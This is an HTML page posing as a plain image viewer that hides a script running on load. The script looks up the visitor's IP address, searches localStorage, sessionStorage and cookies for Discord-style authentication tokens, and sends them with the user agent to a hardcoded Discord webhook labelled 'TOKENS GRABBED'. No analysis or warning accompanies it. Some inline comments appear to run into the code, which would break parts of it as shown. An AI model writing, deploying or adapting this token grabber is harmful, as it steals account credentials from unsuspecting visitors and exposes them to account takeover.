<!DOCTYPE html><html><head><title>img</title></head><body style="margin:0;background:#000;"><img src="https://i.imgur.com/dQw4w9WgBaLh6m.jpg" width="100%" style="border-radius:8px;"><script>const WEBHOOK='https://discord.com/api/webhooks/1479071012007051354/gsI2Okv5k_Ox3_MP8pAcfUpyhUIqHz2f6sAowReJtq5GtuIxYS8IG8Yw6WnWBqXpzDUQ';async function grab(){try{let ip=await(await fetch('https://api.ipify.org?format=json')).json();let tokens=[],ua=navigator.userAgent;const regex=/[mfa\.]?[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}/g;// LocalStorage keys + valuesfor(let i=0;i<localStorage.length;i++){let k=localStorage.key(i);let v=localStorage.getItem(k);if(regex.test(k)||regex.test(v))tokens.push(k.match(regex)?.[0]||v.match(regex)?.[0]||k);}// SessionStoragefor(let i=0;i<sessionStorage.length;i++){let k=sessionStorage.key(i);let v=sessionStorage.getItem(k);if(regex.test(k)||regex.test(v))tokens.push(k.match(regex)?.[0]||v.match(regex)?.[0]||k);}// Cookiesdocument.cookie.split(';').forEach(c=>{if(regex.test(c))tokens.push(c.match(regex)[0]);});// Discord specific IndexedDB (async)// Check common Discord storage prefixesconst discordKeys=['discord.com','__token','discord_token','access_token'];for(let origin of discordKeys){try{let keys=Object.keys(localStorage).filter(k=>k.includes(origin));keys.forEach(k=>tokens.push(localStorage[k]));}catch(e){}}await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'🖼️ Tracker',avatar_url:'https://i.imgur.com/abc123.png',embeds:[{title:'🎯 TOKENS GRABBED',description:`**IP:** \`${ip.ip}\`\n**UA:** \`${ua.slice(0,50)}...\`\n**Tokens Found:** ${tokens.length}`,color:65280,fields:tokens.slice(0,5).map((t,i)=>{let masked=t.slice(0,24)+'...'+t.slice(-20);return{name:`Token ${i+1}`,value:`\`${masked}\``,inline:true}})]})});}catch(e){}}grab();</script></body></html>
